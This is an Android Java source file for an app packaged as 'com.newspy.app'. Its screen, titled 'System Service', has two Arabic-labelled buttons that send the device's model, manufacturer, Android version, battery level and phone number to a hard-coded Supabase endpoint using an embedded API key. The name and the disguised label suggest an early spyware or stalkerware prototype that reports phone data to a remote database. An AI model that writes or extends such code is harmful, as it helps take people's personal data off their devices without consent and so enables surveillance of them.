package com.newspy.app;

import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.UUID;

public class MainActivity extends AppCompatActivity {

    public static final String SB_URL = "https://kuxrsbgmwegyfemsgqyo.supabase.co";
    public static final String SB_KEY = "sb_publishable_EYcfqp_BDYa7WbdDQUDvJA_YUQPqyDy";
    private TextView log;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(40, 60, 40, 40);
        sv.addView(ll);

        log = new TextView(this);
        log.setTextSize(13);
        log.setText("System Service\nID: " + getDeviceId());
        ll.addView(log);

        Button b1 = new Button(this);
        b1.setText("🚀 رفع الجهاز");
        b1.setOnClickListener(v -> testUpload());
        ll.addView(b1);

        Button b2 = new Button(this);
        b2.setText("📋 رفع كامل");
        b2.setOnClickListener(v -> fullUpload());
        ll.addView(b2);

        setContentView(sv);
        append("جاهز");
    }

    private String getDeviceId() {
        String id = getSharedPreferences("x", MODE_PRIVATE).getString("did", null);
        if (id == null) {
            id = UUID.randomUUID().toString();
            getSharedPreferences("x", MODE_PRIVATE).edit().putString("did", id).apply();
        }
        return id;
    }

    private void append(String s) {
        runOnUiThread(() -> log.append("\n" + s));
    }

    private void testUpload() {
        new Thread(() -> {
            try {
                JSONObject o = new JSONObject();
                o.put("device_id", getDeviceId());
                o.put("model", Build.MODEL);
                o.put("manufacturer", Build.MANUFACTURER);
                o.put("android_version", Build.VERSION.RELEASE);
                o.put("status", "online");

                boolean ok = post("devices", o);
                append(ok ? "✅ نجح: تم الرفع" : "❌ فشل الرفع");
            } catch (Exception e) {
                append("❌ " + e.getMessage());
            }
        }).start();
    }

    private void fullUpload() {
        new Thread(() -> {
            try {
                // حذف القديم
                delete("devices?device_id=eq." + getDeviceId());

                JSONObject o = new JSONObject();
                o.put("device_id", getDeviceId());
                o.put("model", Build.MODEL);
                o.put("manufacturer", Build.MANUFACTURER);
                o.put("android_version", Build.VERSION.RELEASE);
                o.put("status", "online");

                // battery
                try {
                    android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(Context.BATTERY_SERVICE);
                    o.put("battery", bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY));
                } catch (Exception e) {}

                // phone number
                try {
                    TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                    o.put("phone_number", tm.getLine1Number() == null ? "-" : tm.getLine1Number());
                } catch (Exception e) {}

                boolean ok = post("devices", o);
                append(ok ? "✅ تم الرفع الكامل" : "❌ فشل");
            } catch (Exception e) {
                append("❌ " + e.getMessage());
            }
        }).start();
    }

    private boolean post(String table, JSONObject data) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(SB_URL + "/rest/v1/" + table).openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("apikey", SB_KEY);
            c.setRequestProperty("Authorization", "Bearer " + SB_KEY);
            c.setRequestProperty("Content-Type", "application/json");
            c.setDoOutput(true);
            OutputStream os = c.getOutputStream();
            os.write(data.toString().getBytes());
            os.close();
            int code = c.getResponseCode();
            append("HTTP: " + code);
            return code < 400;
        } catch (Exception e) {
            append("POST err: " + e.getMessage());
            return false;
        }
    }

    private void delete(String q) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(SB_URL + "/rest/v1/" + q).openConnection();
            c.setRequestMethod("DELETE");
            c.setRequestProperty("apikey", SB_KEY);
            c.setRequestProperty("Authorization", "Bearer " + SB_KEY);
            int code = c.getResponseCode();
            append("DELETE: " + code);
        } catch (Exception e) {
            append("DEL err: " + e.getMessage());
        }
    }
}
